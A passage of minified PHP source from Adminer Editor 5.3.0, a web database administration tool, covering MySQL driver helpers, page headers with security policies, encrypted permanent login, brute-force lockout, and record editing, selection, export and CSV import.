array("fields"=>$m,"comment"=>get_val("SELECT ROUTINE_COMMENT FROM information_schema.ROUTINES WHERE ROUTINE_SCHEMA = DATABASE() AND ROUTINE_NAME = ".q($_)),)+($U!="FUNCTION"?array("definition"=>$z[11]):array("returns"=>array("type"=>$z[12],"length"=>$z[13],"unsigned"=>$z[15],"collation"=>$z[16]),"definition"=>$z[17],"language"=>"SQL",));}function
routines(){return
get_rows("SELECT ROUTINE_NAME AS SPECIFIC_NAME, ROUTINE_NAME, ROUTINE_TYPE, DTD_IDENTIFIER FROM information_schema.ROUTINES WHERE ROUTINE_SCHEMA = DATABASE()");}function
routine_languages(){return
array();}function
routine_id($_,array$I){return
idf_escape($_);}function
last_id($G){return
get_val("SELECT LAST_INSERT_ID()");}function
explain(Db$g,$F){return$g->query("EXPLAIN ".(min_version(5.1)&&!min_version(5.7)?"PARTITIONS ":"").$F);}function
found_rows(array$S,array$Z){return($Z||$S["Engine"]!="InnoDB"?null:$S["Rows"]);}function
create_sql($R,$ta,$dg){$H=get_val("SHOW CREATE TABLE ".table($R),1);if(!$ta)$H=preg_replace('~ AUTO_INCREMENT=\d+~','',$H);return$H;}function
truncate_sql($R){return"TRUNCATE ".table($R);}function
use_sql($tb){return"USE ".idf_escape($tb);}function
trigger_sql($R){$H="";foreach(get_rows("SHOW TRIGGERS LIKE ".q(addcslashes($R,"%_\\")),null,"-- ")as$I)$H
.="\nCREATE TRIGGER ".idf_escape($I["Trigger"])." $I[Timing] $I[Event] ON ".table($I["Table"])." FOR EACH ROW\n$I[Statement];;\n";return$H;}function
show_variables(){return
get_rows("SHOW VARIABLES");}function
show_status(){return
get_rows("SHOW STATUS");}function
process_list(){return
get_rows("SHOW FULL PROCESSLIST");}function
convert_field(array$l){if(preg_match("~binary~",$l["type"]))return"HEX(".idf_escape($l["field"]).")";if($l["type"]=="bit")return"BIN(".idf_escape($l["field"])." + 0)";if(preg_match("~geometry|point|linestring|polygon~",$l["type"]))return(min_version(8)?"ST_":"")."AsWKT(".idf_escape($l["field"]).")";}function
unconvert_field(array$l,$H){if(preg_match("~binary~",$l["type"]))$H="UNHEX($H)";if($l["type"]=="bit")$H="CONVERT(b$H, UNSIGNED)";if(preg_match("~geometry|point|linestring|polygon~",$l["type"])){$ef=(min_version(8)?"ST_":"");$H=$ef."GeomFromText($H, $ef"."SRID($l[field]))";}return$H;}function
support($jc){return
preg_match('~^(comment|columns|copy|database|drop_col|dump|indexes|kill|privileges|move_col|procedure|processlist|routine|sql|status|table|trigger|variables|view'.(min_version(5.1)?'|event':'').(min_version(8)?'|descidx':'').(min_version('8.0.16','10.2.1')?'|check':'').')$~',$jc);}function
kill_process($X){return
queries("KILL ".number($X));}function
connection_id(){return"SELECT CONNECTION_ID()";}function
max_connections(){return
get_val("SELECT @@max_connections");}function
types(){return
array();}function
type_values($s){return"";}function
schemas(){return
array();}function
get_schema(){return"";}function
set_schema($Cf,$h=null){return
true;}}define('Adminer\JUSH',Driver::$jush);define('Adminer\SERVER',$_GET[DRIVER]);define('Adminer\DB',$_GET["db"]);define('Adminer\ME',preg_replace('~\?.*~','',relative_uri()).'?'.(sid()?SID.'&':'').(SERVER!==null?DRIVER."=".urlencode(SERVER).'&':'').($_GET["ext"]?"ext=".urlencode($_GET["ext"]).'&':'').(isset($_GET["username"])?"username=".urlencode($_GET["username"]).'&':'').(DB!=""?'db='.urlencode(DB).'&'.(isset($_GET["ns"])?"ns=".urlencode($_GET["ns"])."&":""):''));function
page_header($vg,$k="",$Ga=array(),$wg=""){page_headers();if(is_ajax()&&$k){page_messages($k);exit;}if(!ob_get_level())ob_start('ob_gzhandler',4096);$xg=$vg.($wg!=""?": $wg":"");$yg=strip_tags($xg.(SERVER!=""&&SERVER!="localhost"?h(" - ".SERVER):"")." - ".adminer()->name());echo'<!DOCTYPE html>
<html lang="',LANG,'" dir="',lang(56),'">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="robots" content="noindex">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>',$yg,'</title>
<link rel="stylesheet" href="',h(preg_replace("~\\?.*~","",ME)."?file=default.css&version=5.3.0"),'">
';$pb=adminer()->css();if(is_int(key($pb)))$pb=array_fill_keys($pb,'light');$Oc=in_array('light',$pb)||in_array('',$pb);$Lc=in_array('dark',$pb)||in_array('',$pb);$rb=($Oc?($Lc?null:false):($Lc?:null));$Zd=" media='(prefers-color-scheme: dark)'";if($rb!==false)echo"<link rel='stylesheet'".($rb?"":$Zd)." href='".h(preg_replace("~\\?.*~","",ME)."?file=dark.css&version=5.3.0")."'>\n";echo"<meta name='color-scheme' content='".($rb===null?"light dark":($rb?"dark":"light"))."'>\n",script_src(preg_replace("~\\?.*~","",ME)."?file=functions.js&version=5.3.0");if(adminer()->head($rb))echo"<link rel='icon' href='data:image/gif;base64,R0lGODlhEAAQAJEAAAQCBPz+/PwCBAROZCH5BAEAAAAALAAAAAAQABAAAAI2hI+pGO1rmghihiUdvUBnZ3XBQA7f05mOak1RWXrNq5nQWHMKvuoJ37BhVEEfYxQzHjWQ5qIAADs='>\n","<link rel='apple-touch-icon' href='".h(preg_replace("~\\?.*~","",ME)."?file=logo.png&version=5.3.0")."'>\n";foreach($pb
as$Wg=>$ee){$ra=($ee=='dark'&&!$rb?$Zd:($ee=='light'&&$Lc?" media='(prefers-color-scheme: light)'":""));echo"<link rel='stylesheet'$ra href='".h($Wg)."'>\n";}echo"\n<body class='".lang(56)." nojs";adminer()->bodyClass();echo"'>\n";$n=get_temp_dir()."/adminer.version";if(!$_COOKIE["adminer_version"]&&function_exists('openssl_verify')&&file_exists($n)&&filemtime($n)+86400>time()){$dh=unserialize(file_get_contents($n));$kf="-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwqWOVuF5uw7/+Z70djoK
RlHIZFZPO0uYRezq90+7Amk+FDNd7KkL5eDve+vHRJBLAszF/7XKXe11xwliIsFs
DFWQlsABVZB3oisKCBEuI71J4kPH8dKGEWR9jDHFw3cWmoH3PmqImX6FISWbG3B8
h7FIx3jEaw5ckVPVTeo5JRm/1DZzJxjyDenXvBQ/6o9DgZKeNDgxwKzH+sw9/YCO
jHnq1cFpOIISzARlrHMa/43YfeNRAm/tsBXjSxembBPo7aQZLAWHmaj5+K19H10B
nCpz9Y++cipkVEiKRGih4ZEvjoFysEOdRLj6WiD/uUNky4xGeA6LaJqh5XpkFkcQ
fQIDAQAB
-----END PUBLIC KEY-----
";if(openssl_verify($dh["version"],base64_decode($dh["signature"]),$kf)==1)$_COOKIE["adminer_version"]=$dh["version"];}echo
script("mixin(document.body, {onkeydown: bodyKeydown, onclick: bodyClick".(isset($_COOKIE["adminer_version"])?"":", onload: partial(verifyVersion, '".VERSION."', '".js_escape(ME)."', '".get_token()."')")."});
document.body.classList.replace('nojs', 'js');
const offlineMessage = '".js_escape(lang(57))."';
const thousandsSeparator = '".js_escape(lang(4))."';"),"<div id='help' class='jush-".JUSH." jsonly hidden'></div>\n",script("mixin(qs('#help'), {onmouseover: () => { helpOpen = 1; }, onmouseout: helpMouseout});"),"<div id='content'>\n","<span id='menuopen' class='jsonly'>".icon("move","","menu","")."</span>".script("qs('#menuopen').onclick = event => { qs('#foot').classList.toggle('foot'); event.stopPropagation(); }");if($Ga!==null){$y=substr(preg_replace('~\b(username|db|ns)=[^&]*&~','',ME),0,-1);echo'<p id="breadcrumb"><a href="'.h($y?:".").'">'.get_driver(DRIVER).'</a> » ';$y=substr(preg_replace('~\b(db|ns)=[^&]*&~','',ME),0,-1);$M=adminer()->serverName(SERVER);$M=($M!=""?$M:lang(58));if($Ga===false)echo"$M\n";else{echo"<a href='".h($y)."' accesskey='1' title='Alt+Shift+1'>$M</a> » ";if($_GET["ns"]!=""||(DB!=""&&is_array($Ga)))echo'<a href="'.h($y."&db=".urlencode(DB).(support("scheme")?"&ns=":"")).'">'.h(DB).'</a> » ';if(is_array($Ga)){if($_GET["ns"]!="")echo'<a href="'.h(substr(ME,0,-1)).'">'.h($_GET["ns"]).'</a> » ';foreach($Ga
as$w=>$X){$zb=(is_array($X)?$X[1]:h($X));if($zb!="")echo"<a href='".h(ME."$w=").urlencode(is_array($X)?$X[0]:$X)."'>$zb</a> » ";}}echo"$vg\n";}}echo"<h2>$xg</h2>\n","<div id='ajaxstatus' class='jsonly hidden'></div>\n";restart_session();page_messages($k);$ub=&get_session("dbs");if(DB!=""&&$ub&&!in_array(DB,$ub,true))$ub=null;stop_session();define('Adminer\PAGE_HEADER',1);}function
page_headers(){header("Content-Type: text/html; charset=utf-8");header("Cache-Control: no-cache");header("X-Frame-Options: deny");header("X-XSS-Protection: 0");header("X-Content-Type-Options: nosniff");header("Referrer-Policy: origin-when-cross-origin");foreach(adminer()->csp(csp())as$ob){$Qc=array();foreach($ob
as$w=>$X)$Qc[]="$w $X";header("Content-Security-Policy: ".implode("; ",$Qc));}adminer()->headers();}function
csp(){return
array(array("script-src"=>"'self' 'unsafe-inline' 'nonce-".get_nonce()."' 'strict-dynamic'","connect-src"=>"'self'","frame-src"=>"https://www.adminer.org","object-src"=>"'none'","base-uri"=>"'none'","form-action"=>"'self'",),);}function
get_nonce(){static$ne;if(!$ne)$ne=base64_encode(rand_string());return$ne;}function
page_messages($k){$Vg=preg_replace('~^[^?]*~','',$_SERVER["REQUEST_URI"]);$be=idx($_SESSION["messages"],$Vg);if($be){echo"<div class='message'>".implode("</div>\n<div class='message'>",$be)."</div>".script("messagesPrint();");unset($_SESSION["messages"][$Vg]);}if($k)echo"<div class='error'>$k</div>\n";if(adminer()->error)echo"<div class='error'>".adminer()->error."</div>\n";}function
page_footer($de=""){echo"</div>\n\n<div id='foot' class='foot'>\n<div id='menu'>\n";adminer()->navigation($de);echo"</div>\n";if($de!="auth")echo'<form action="" method="post">
<p class="logout">
<span>',h($_GET["username"])."\n",'</span>
<input type="submit" name="logout" value="',lang(59),'" id="logout">
',input_token(),'</form>
';echo"</div>\n\n",script("setupSubmitHighlight(document);");}function
int32($ie){while($ie>=2147483648)$ie-=4294967296;while($ie<=-2147483649)$ie+=4294967296;return(int)$ie;}function
long2str(array$W,$hh){$Bf='';foreach($W
as$X)$Bf
.=pack('V',$X);if($hh)return
substr($Bf,0,end($W));return$Bf;}function
str2long($Bf,$hh){$W=array_values(unpack('V*',str_pad($Bf,4*ceil(strlen($Bf)/4),"\0")));if($hh)$W[]=strlen($Bf);return$W;}function
xxtea_mx($mh,$lh,$gg,$yd){return
int32((($mh>>5&0x7FFFFFF)^$lh<<2)+(($lh>>3&0x1FFFFFFF)^$mh<<4))^int32(($gg^$lh)+($yd^$mh));}function
encrypt_string($cg,$w){if($cg=="")return"";$w=array_values(unpack("V*",pack("H*",md5($w))));$W=str2long($cg,true);$ie=count($W)-1;$mh=$W[$ie];$lh=$W[0];$lf=floor(6+52/($ie+1));$gg=0;while($lf-->0){$gg=int32($gg+0x9E3779B9);$Kb=$gg>>2&3;for($Le=0;$Le<$ie;$Le++){$lh=$W[$Le+1];$he=xxtea_mx($mh,$lh,$gg,$w[$Le&3^$Kb]);$mh=int32($W[$Le]+$he);$W[$Le]=$mh;}$lh=$W[0];$he=xxtea_mx($mh,$lh,$gg,$w[$Le&3^$Kb]);$mh=int32($W[$ie]+$he);$W[$ie]=$mh;}return
long2str($W,false);}function
decrypt_string($cg,$w){if($cg=="")return"";if(!$w)return
false;$w=array_values(unpack("V*",pack("H*",md5($w))));$W=str2long($cg,false);$ie=count($W)-1;$mh=$W[$ie];$lh=$W[0];$lf=floor(6+52/($ie+1));$gg=int32($lf*0x9E3779B9);while($gg){$Kb=$gg>>2&3;for($Le=$ie;$Le>0;$Le--){$mh=$W[$Le-1];$he=xxtea_mx($mh,$lh,$gg,$w[$Le&3^$Kb]);$lh=int32($W[$Le]-$he);$W[$Le]=$lh;}$mh=$W[$ie];$he=xxtea_mx($mh,$lh,$gg,$w[$Le&3^$Kb]);$lh=int32($W[0]-$he);$W[0]=$lh;$gg=int32($gg-0x9E3779B9);}return
long2str($W,true);}$Xe=array();if($_COOKIE["adminer_permanent"]){foreach(explode(" ",$_COOKIE["adminer_permanent"])as$X){list($w)=explode(":",$X);$Xe[$w]=$X;}}function
add_invalid_login(){$_a=get_temp_dir()."/adminer.invalid";foreach(glob("$_a*")?:array($_a)as$n){$p=file_open_lock($n);if($p)break;}if(!$p)$p=file_open_lock("$_a-".rand_string());if(!$p)return;$rd=unserialize(stream_get_contents($p));$sg=time();if($rd){foreach($rd
as$sd=>$X){if($X[0]<$sg)unset($rd[$sd]);}}$qd=&$rd[adminer()->bruteForceKey()];if(!$qd)$qd=array($sg+30*60,0);$qd[1]++;file_write_unlock($p,serialize($rd));}function
check_invalid_login(array&$Xe){$rd=array();foreach(glob(get_temp_dir()."/adminer.invalid*")as$n){$p=file_open_lock($n);if($p){$rd=unserialize(stream_get_contents($p));file_unlock($p);break;}}$qd=idx($rd,adminer()->bruteForceKey(),array());$me=($qd[1]>29?$qd[0]-time():0);if($me>0)auth_error(lang(60,ceil($me/60)),$Xe);}$sa=$_POST["auth"];if($sa){session_regenerate_id();$ch=$sa["driver"];$M=$sa["server"];$V=$sa["username"];$D=(string)$sa["password"];$i=$sa["db"];set_password($ch,$M,$V,$D);$_SESSION["db"][$ch][$M][$V][$i]=true;if($sa["permanent"]){$w=implode("-",array_map('base64_encode',array($ch,$M,$V,$i)));$if=adminer()->permanentLogin(true);$Xe[$w]="$w:".base64_encode($if?encrypt_string($D,$if):"");cookie("adminer_permanent",implode(" ",$Xe));}if(count($_POST)==1||DRIVER!=$ch||SERVER!=$M||$_GET["username"]!==$V||DB!=$i)redirect(auth_url($ch,$M,$V,$i));}elseif($_POST["logout"]&&(!$_SESSION["token"]||verify_token())){foreach(array("pwds","db","dbs","queries")as$w)set_session($w,null);unset_permanent($Xe);redirect(substr(preg_replace('~\b(username|db|ns)=[^&]*&~','',ME),0,-1),lang(61).' '.lang(62));}elseif($Xe&&!$_SESSION["pwds"]){session_regenerate_id();$if=adminer()->permanentLogin();foreach($Xe
as$w=>$X){list(,$Qa)=explode(":",$X);list($ch,$M,$V,$i)=array_map('base64_decode',explode("-",$w));set_password($ch,$M,$V,decrypt_string(base64_decode($Qa),$if));$_SESSION["db"][$ch][$M][$V][$i]=true;}}function
unset_permanent(array&$Xe){foreach($Xe
as$w=>$X){list($ch,$M,$V,$i)=array_map('base64_decode',explode("-",$w));if($ch==DRIVER&&$M==SERVER&&$V==$_GET["username"]&&$i==DB)unset($Xe[$w]);}cookie("adminer_permanent",implode(" ",$Xe));}function
auth_error($k,array&$Xe){$Pf=session_name();if(isset($_GET["username"])){header("HTTP/1.1 403 Forbidden");if(($_COOKIE[$Pf]||$_GET[$Pf])&&!$_SESSION["token"])$k=lang(63);else{restart_session();add_invalid_login();$D=get_password();if($D!==null){if($D===false)$k
.=($k?'<br>':'').lang(64,target_blank(),'<code>permanentLogin()</code>');set_password(DRIVER,SERVER,$_GET["username"],null);}unset_permanent($Xe);}}if(!$_COOKIE[$Pf]&&$_GET[$Pf]&&ini_bool("session.use_only_cookies"))$k=lang(65);$Oe=session_get_cookie_params();cookie("adminer_key",($_COOKIE["adminer_key"]?:rand_string()),$Oe["lifetime"]);if(!$_SESSION["token"])$_SESSION["token"]=rand(1,1e6);page_header(lang(35),$k,null);echo"<form action='' method='post'>\n","<div>";if(hidden_fields($_POST,array("auth")))echo"<p class='message'>".lang(66)."\n";echo"</div>\n";adminer()->loginForm();echo"</form>\n";page_footer("auth");exit;}if(isset($_GET["username"])&&!class_exists('Adminer\Db')){unset($_SESSION["pwds"][DRIVER]);unset_permanent($Xe);page_header(lang(67),lang(68,implode(", ",Driver::$extensions)),false);page_footer("auth");exit;}$g='';if(isset($_GET["username"])&&is_string(get_password())){list($Wc,$af)=explode(":",SERVER,2);if(preg_match('~^\s*([-+]?\d+)~',$af,$z)&&($z[1]<1024||$z[1]>65535))auth_error(lang(69),$Xe);check_invalid_login($Xe);$nb=adminer()->credentials();$g=Driver::connect($nb[0],$nb[1],$nb[2]);if(is_object($g)){Db::$instance=$g;Driver::$instance=new
Driver($g);if($g->flavor)save_settings(array("vendor-".DRIVER."-".SERVER=>get_driver(DRIVER)));}}$Nd=null;if(!is_object($g)||($Nd=adminer()->login($_GET["username"],get_password()))!==true){$k=(is_string($g)?nl_br(h($g)):(is_string($Nd)?$Nd:lang(70))).(preg_match('~^ | $~',get_password())?'<br>'.lang(71):'');auth_error($k,$Xe);}if($_POST["logout"]&&$_SESSION["token"]&&!verify_token()){page_header(lang(59),lang(72));page_footer("db");exit;}if(!$_SESSION["token"])$_SESSION["token"]=rand(1,1e6);stop_session(true);if($sa&&$_POST["token"])$_POST["token"]=get_token();$k='';if($_POST){if(!verify_token()){$kd="max_input_vars";$Xd=ini_get($kd);if(extension_loaded("suhosin")){foreach(array("suhosin.request.max_vars","suhosin.post.max_vars")as$w){$X=ini_get($w);if($X&&(!$Xd||$X<$Xd)){$kd=$w;$Xd=$X;}}}$k=(!$_POST["token"]&&$Xd?lang(73,"'$kd'"):lang(72).' '.lang(74));}}elseif($_SERVER["REQUEST_METHOD"]=="POST"){$k=lang(75,"'post_max_size'");if(isset($_GET["sql"]))$k
.=' '.lang(76);}function
doc_link(array$Ue,$og=""){return"";}function
email_header($Qc){return"=?UTF-8?B?".base64_encode($Qc)."?=";}function
send_mail($Ob,$eg,$ae,$Bc="",array$nc=array()){$Wb=PHP_EOL;$ae=str_replace("\n",$Wb,wordwrap(str_replace("\r","","$ae\n")));$Fa=uniqid("boundary");$qa="";foreach((array)$nc["error"]as$w=>$X){if(!$X)$qa
.="--$Fa$Wb"."Content-Type: ".str_replace("\n","",$nc["type"][$w]).$Wb."Content-Disposition: attachment; filename=\"".preg_replace('~["\n]~','',$nc["name"][$w])."\"$Wb"."Content-Transfer-Encoding: base64$Wb$Wb".chunk_split(base64_encode(file_get_contents($nc["tmp_name"][$w])),76,$Wb).$Wb;}$Ba="";$Rc="Content-Type: text/plain; charset=utf-8$Wb"."Content-Transfer-Encoding: 8bit";if($qa){$qa
.="--$Fa--$Wb";$Ba="--$Fa$Wb$Rc$Wb$Wb";$Rc="Content-Type: multipart/mixed; boundary=\"$Fa\"";}$Rc
.=$Wb."MIME-Version: 1.0$Wb"."X-Mailer: Adminer Editor".($Bc?$Wb."From: ".str_replace("\n","",$Bc):"");return
mail($Ob,email_header($eg),$Ba.$ae.$qa,$Rc);}function
like_bool(array$l){return
preg_match("~bool|(tinyint|bit)\\(1\\)~",$l["full_type"]);}connection()->select_db(adminer()->database());add_driver(DRIVER,lang(35));if(isset($_GET["select"])&&($_POST["edit"]||$_POST["clone"])&&!$_POST["save"])$_GET["edit"]=$_GET["select"];if(isset($_GET["download"])){$a=$_GET["download"];$m=fields($a);header("Content-Type: application/octet-stream");header("Content-Disposition: attachment; filename=".friendly_url("$a-".implode("_",$_GET["where"])).".".friendly_url($_GET["field"]));$K=array(idf_escape($_GET["field"]));$G=driver()->select($a,$K,array(where($_GET,$m)),$K);$I=($G?$G->fetch_row():array());echo
driver()->value($I[0],$m[$_GET["field"]]);exit;}elseif(isset($_GET["edit"])){$a=$_GET["edit"];$m=fields($a);$Z=(isset($_GET["select"])?($_POST["check"]&&count($_POST["check"])==1?where_check($_POST["check"][0],$m):""):where($_GET,$m));$Ug=(isset($_GET["select"])?$_POST["edit"]:$Z);foreach($m
as$_=>$l){if(!isset($l["privileges"][$Ug?"update":"insert"])||adminer()->fieldName($l)==""||$l["generated"])unset($m[$_]);}if($_POST&&!$k&&!isset($_GET["select"])){$Md=$_POST["referer"];if($_POST["insert"])$Md=($Ug?null:$_SERVER["REQUEST_URI"]);elseif(!preg_match('~^.+&select=.+$~',$Md))$Md=ME."select=".urlencode($a);$v=indexes($a);$Pg=unique_array($_GET["where"],$v);$of="\nWHERE $Z";if(isset($_POST["delete"]))queries_redirect($Md,lang(77),driver()->delete($a,$of,$Pg?0:1));else{$N=array();foreach($m
as$_=>$l){$X=process_input($l);if($X!==false&&$X!==null)$N[idf_escape($_)]=$X;}if($Ug){if(!$N)redirect($Md);queries_redirect($Md,lang(78),driver()->update($a,$N,$of,$Pg?0:1));if(is_ajax()){page_headers();page_messages($k);exit;}}else{$G=driver()->insert($a,$N);$Gd=($G?last_id($G):0);queries_redirect($Md,lang(79,($Gd?" $Gd":"")),$G);}}}$I=null;if($_POST["save"])$I=(array)$_POST["fields"];elseif($Z){$K=array();foreach($m
as$_=>$l){if(isset($l["privileges"]["select"])){$oa=($_POST["clone"]&&$l["auto_increment"]?"''":convert_field($l));$K[]=($oa?"$oa AS ":"").idf_escape($_);}}$I=array();if(!support("table"))$K=array("*");if($K){$G=driver()->select($a,$K,array($Z),$K,array(),(isset($_GET["select"])?2:1));if(!$G)$k=error();else{$I=$G->fetch_assoc();if(!$I)$I=false;}if(isset($_GET["select"])&&(!$I||$G->fetch_assoc()))$I=null;}}if(!support("table")&&!$m){if(!$Z){$G=driver()->select($a,array("*"),array(),array("*"));$I=($G?$G->fetch_assoc():false);if(!$I)$I=array(driver()->primary=>"");}if($I){foreach($I
as$w=>$X){if(!$Z)$I[$w]=null;$m[$w]=array("field"=>$w,"null"=>($w!=driver()->primary),"auto_increment"=>($w==driver()->primary));}}}edit_form($a,$m,$I,$Ug,$k);}elseif(isset($_GET["select"])){$a=$_GET["select"];$S=table_status1($a);$v=indexes($a);$m=fields($a);$zc=column_foreign_keys($a);$se=$S["Oid"];$ha=get_settings("adminer_import");$_f=array();$e=array();$Ff=array();$De=array();$qg="";foreach($m
as$w=>$l){$_=adminer()->fieldName($l);$je=html_entity_decode(strip_tags($_),ENT_QUOTES);if(isset($l["privileges"]["select"])&&$_!=""){$e[$w]=$je;if(is_shortable($l))$qg=adminer()->selectLengthProcess();}if(isset($l["privileges"]["where"])&&$_!="")$Ff[$w]=$je;if(isset($l["privileges"]["order"])&&$_!="")$De[$w]=$je;$_f+=$l["privileges"];}list($K,$Gc)=adminer()->selectColumnsProcess($e,$v);$K=array_unique($K);$Gc=array_unique($Gc);$td=count($Gc)<count($K);$Z=adminer()->selectSearchProcess($m,$v);$Ce=adminer()->selectOrderProcess($m,$v);$x=adminer()->selectLimitProcess();if($_GET["val"]&&is_ajax()){header("Content-Type: text/plain; charset=utf-8");foreach($_GET["val"]as$Qg=>$I){$oa=convert_field($m[key($I)]);$K=array($oa?:idf_escape(key($I)));$Z[]=where_check($Qg,$m);$H=driver()->select($a,$K,$Z,$K);if($H)echo
first($H->fetch_row());}exit;}$E=$Sg=array();foreach($v
as$u){if($u["type"]=="PRIMARY"){$E=array_flip($u["columns"]);$Sg=($K?$E:array());foreach($Sg
as$w=>$X){if(in_array(idf_escape($w),$K))unset($Sg[$w]);}break;}}if($se&&!$E){$E=$Sg=array($se=>0);$v[]=array("type"=>"PRIMARY","columns"=>array($se));}if($_POST&&!$k){$jh=$Z;if(!$_POST["all"]&&is_array($_POST["check"])){$Pa=array();foreach($_POST["check"]as$Ma)$Pa[]=where_check($Ma,$m);$jh[]="((".implode(") OR (",$Pa)."))";}$jh=($jh?"\nWHERE ".implode(" AND ",$jh):"");if($_POST["export"]){save_settings(array("output"=>$_POST["output"],"format"=>$_POST["format"]),"adminer_import");dump_headers($a);adminer()->dumpTable($a,"");$Bc=($K?implode(", ",$K):"*").convert_fields($e,$m,$K)."\nFROM ".table($a);$Ic=($Gc&&$td?"\nGROUP BY ".implode(", ",$Gc):"").($Ce?"\nORDER BY ".implode(", ",$Ce):"");$F="SELECT $Bc$jh$Ic";if(is_array($_POST["check"])&&!$E){$Og=array();foreach($_POST["check"]as$X)$Og[]="(SELECT".limit($Bc,"\nWHERE ".($Z?implode(" AND ",$Z)." AND ":"").where_check($X,$m).$Ic,1).")";$F=implode(" UNION ALL ",$Og);}adminer()->dumpData($a,"table",$F);adminer()->dumpFooter();exit;}if(!adminer()->selectEmailProcess($Z,$zc)){if($_POST["save"]||$_POST["delete"]){$G=true;$ia=0;$N=array();if(!$_POST["delete"]){foreach($_POST["fields"]as$_=>$X){$X=process_input($m[$_]);if($X!==null&&($_POST["clone"]||$X!==false))$N[idf_escape($_)]=($X!==false?$X:idf_escape($_));}}if($_POST["delete"]||$N){$F=($_POST["clone"]?"INTO ".table($a)." (".implode(", ",array_keys($N)).")\nSELECT ".implode(", ",$N)."\nFROM ".table($a):"");if($_POST["all"]||($E&&is_array($_POST["check"]))||$td){$G=($_POST["delete"]?driver()->delete($a,$jh):($_POST["clone"]?queries("INSERT $F$jh".driver()->insertReturning($a)):driver()->update($a,$N,$jh)));$ia=connection()->affected_rows;if(is_object($G))$ia+=$G->num_rows;}else{foreach((array)$_POST["check"]as$X){$ih="\nWHERE ".($Z?implode(" AND ",$Z)." AND ":"").where_check($X,$m);$G=($_POST["delete"]?driver()->delete($a,$ih,1):($_POST["clone"]?queries("INSERT".limit1($a,$F,$ih)):driver()->update($a,$N,$ih,1)));if(!$G)break;$ia+=connection()->affected_rows;}}}$ae=lang(80,$ia);if($_POST["clone"]&&$G&&$ia==1){$Gd=last_id($G);if($Gd)$ae=lang(79," $Gd");}queries_redirect(remove_from_uri($_POST["all"]&&$_POST["delete"]?"page":""),$ae,$G);if(!$_POST["delete"]){$cf=(array)$_POST["fields"];edit_form($a,array_intersect_key($m,$cf),$cf,!$_POST["clone"],$k);page_footer();exit;}}elseif(!$_POST["import"]){if(!$_POST["val"])$k=lang(81);else{$G=true;$ia=0;foreach($_POST["val"]as$Qg=>$I){$N=array();foreach($I
as$w=>$X){$w=bracket_escape($w,true);$N[idf_escape($w)]=(preg_match('~char|text~',$m[$w]["type"])||$X!=""?adminer()->processInput($m[$w],$X):"NULL");}$G=driver()->update($a,$N," WHERE ".($Z?implode(" AND ",$Z)." AND ":"").where_check($Qg,$m),($td||$E?0:1)," ");if(!$G)break;$ia+=connection()->affected_rows;}queries_redirect(remove_from_uri(),lang(80,$ia),$G);}}elseif(!is_string($mc=get_file("csv_file",true)))$k=upload_error($mc);elseif(!preg_match('~~u',$mc))$k=lang(82);else{save_settings(array("output"=>$ha["output"],"format"=>$_POST["separator"]),"adminer_import");$G=true;$Xa=array_keys($m);preg_match_all('~(?>"[^"]*"|[^"\r\n]+)+~',$mc,$Td);$ia=count($Td[0]);driver()->begin();$L=($_POST["separator"]=="csv"?",":($_POST["separator"]=="tsv"?"\t":";"));$J=array();foreach($Td[0]as$w=>$X){preg_match_all("~((?>\"[^\"]*\")+|[^$L]*)$L~",$X.$L,$Ud);if(!$w&&!array_diff($Ud[1],$Xa)){$Xa=$Ud[1];$ia--;}else{$N=array();foreach($Ud[1]as$r=>$Va)$N[idf_escape($Xa[$r])]=($Va==""&&$m[$Xa[$r]]["null"]?"NULL":q(preg_match('~^".*"$~s',$Va)?str_replace('""','"',substr($Va,1,-1)):$Va));$J[]=$N;}}$G=(!$J||driver()->insertUpdate($a,$J,$E));if($G)driver()->commit();queries_redirect(remove_from_uri("page"),lang(83,$ia),$G);driver()->rollback();}}}$kg=adminer()->tableName($S);if(is_ajax()){page_headers();ob_start();}else
page_header(lang(47).": $kg",$k);$N=null;if(isset($_f["insert"])||!support("table")){$Oe=array();foreach((array)$_GET["where"]as$X){if(isset($zc[$X["col"]])&&count($zc[$X["col"]])==1&&($X["op"]=="="||(!$X["op"]&&(is_array($X["val"])||!preg_match('~[_%]~',$X["val"])))))$Oe["set"."[".bracket_escape($X["col"])."]"]=$X["val"];}$N=$Oe?"&".http_build_query($Oe):"";}adminer()->selectLinks($S,$N);if(!$e&&support("table"))echo"<p class='error'>".lang(84).($m?".":": ".error())."\n";else{echo"<form action='' id='form'>\n","<div style='display: none;'>";hidden_fields_get();echo(DB!=""?input_hidden("db",DB).(isset($_GET["ns"])?input_hidden("ns",$_GET["ns"]):""):""),input_hidden("select",$a),"</div>\n";adminer()->selectColumnsPrint($K,$e);adminer()->selectSearchPrint($Z,$Ff,$v);adminer()->selectOrderPrint($Ce,$De,$v);adminer()->selectLimitPrint($x);adminer()->selectLengthPrint($qg);adminer()->selectActionPrint($v);echo"</form>\n";$C=$_GET["page"];$Ac=null;if($C=="last"){$Ac=get_val(count_rows($a,$Z,$td,$Gc));$C=floor(max(0,intval($Ac)-1)/$x);}$Gf=$K;$Hc=$Gc;if(!$Gf){$Gf[]="*";$jb=convert_fields($e,$m,$K);if($jb)$Gf[]=substr($jb,2);}foreach($K
as$w=>$X){$l=$m[idf_unescape($X)];if($l&&($oa=convert_field($l)))$Gf[$w]="$oa AS $X";}if(!$td&&$Sg){foreach($Sg
as$w=>$X){$Gf[]=idf_escape($w);if($Hc)$Hc[]=idf_escape($w);}}$G=driver()->select($a,$Gf,$Z,$Hc,$Ce,$x,$C,true);if(!$G)echo"<p class='error'>".error()."\n";else{if(JUSH=="mssql"&&$C)$G->seek($x*$C);$Qb=array();echo"<form action='' method='post' enctype='multipart/form-data'>\n";$J=array();while($I=$G->fetch_assoc()){if($C&&JUSH=="oracle")unset($I["RNUM"]);$J[]=$I;}if($_GET["page"]!="last"&&$x&&$Gc&&$td&&JUSH=="sql")$Ac=get_val(" SELECT FOUND_ROWS()");if(!$J)echo"<p class='message'>".lang(12)."\n";else{$za=adminer()->backwardKeys($a,$kg);echo"<div class='scrollable'>","<table id='table' class='nowrap checkable odds'>",script("mixin(qs('#table'), {onclick: tableClick, ondblclick: partialArg(tableClick, true), onkeydown: editingKeydown});"),"<thead><tr>".(!$Gc&&$K?"":"<td><input type='checkbox' id='all-page' class='jsonly'>".script("qs('#all-page').onclick = partial(formCheck, /check/);","")." <a 